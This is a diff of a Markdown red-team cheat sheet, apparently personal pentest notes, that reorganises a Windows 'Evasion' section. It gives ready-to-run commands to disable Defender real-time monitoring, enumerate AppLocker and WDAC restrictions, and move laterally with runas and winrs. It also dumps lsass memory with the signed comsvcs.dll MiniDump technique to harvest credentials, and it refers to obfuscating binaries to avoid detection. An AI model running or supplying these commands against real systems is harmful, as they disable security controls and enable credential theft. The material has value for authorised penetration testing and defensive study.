@@ -1,4 +1,50 @@
-## Evasion
+# Evasion
+## General
+#### Disable AV monitoring
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+#### Check the language mode
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+
+#### Check if applocker policy is running
+```
+Get-AppLockerPolicy -Effective
+```
+
+#### Enumerate applocker policy
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+#### Check applocker policy in registery
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+```
+
+#### Check for WDAC
+```
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+```
+
+#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
+```
+runas /netonly /user:<DOMAIN\<USER> cmd.exe
+winrs -r:<PC NAME> cmd
+```
+
+### LOLBAS
+- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
+
+#### For example dumping lsass:
+```
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
+dir C:\Users\Public\lsass.dmp
+```
+
 #### Powershell detections
 - System-wide transcription
 - Script Block logging 
@@ -54,19 +100,3 @@ winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
 - In Settings tab edit the rule and select the preset as `Normal`.
 - In Protect tab click on the protect button.
 - We will find the new obfuscated binary in the Confused folder under the Base Directory.
-
-## General
-#### Disable AV monitoring
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
-#### Check the language mode
-```
-$ExecutionContext.SessionState.LanguageMode
-```
-
-#### Enumerate applocker policy
-```
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
